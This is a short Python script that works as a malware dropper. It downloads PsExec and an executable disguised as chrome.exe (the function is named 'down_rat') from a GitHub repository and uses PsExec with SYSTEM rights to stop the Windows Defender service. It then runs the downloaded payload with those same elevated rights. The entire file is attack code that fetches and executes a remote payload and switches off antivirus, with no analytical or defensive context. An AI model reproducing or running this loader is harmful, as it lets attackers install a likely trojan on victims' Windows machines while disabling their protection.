import os
import sys
import urllib3
import getpass
import pty

def down_rat():
	url = "https://github.com/Ccgnnz19/shekksl/raw/main/chrome.exe"
	http = urllib3.PoolManager()
	r = http.request('GET', url, preload_content=False)
	usr = str(getpass.getuser())
	if "'" in usr:
		usr.replace("'","")
	dirt = "C:/Users/"+usr+"/Documenti/chr.exe"
	fln = open(dirt, "wb")
	fln.write(r.read())

def down_ps():
	url_ps = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe"
	http = urllib3.PoolManager()
	r_ps = http.request('GET', url_ps, preload_content=False)
	usr = str(getpass.getuser())
	if "'" in usr:
		usr.replace("'","")
	dirt = "C:/Users/"+usr+"/Documenti/PsExec.exe"
	fln = open(dirt, "wb")
	fln.write(r_ps.read())
	url_ps64 = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec64.exe"
	r_ps64 = http.request('GET', url_ps64, preload_content=False)
	usr = str(getpass.getuser())
	if "'" in usr:
		usr.replace("'","")
	dirt = "C:/Users/"+usr+"/Documenti/PsExec64.exe"
	fln_64 = open(dirt, "wb")
	fln_64.write(r_ps64.read())
	return "C:/Users/"+usr+"/Documenti/"

def main():
	dr = down_ps()
	try:
		cmd = dr + "/PsExec.exe -i -s sc stop WinDefend"
		os.popen(cmd)
	except:
		cmd = dr + "/PsExec64.exe -i -s sc stop WinDefend"
		os.popen(cmd)
	down_rat()
	cmd = dr + "/PsExec64.exe -i -s " + dr + "chr.exe"
	pty.spawn(cmd)

main()
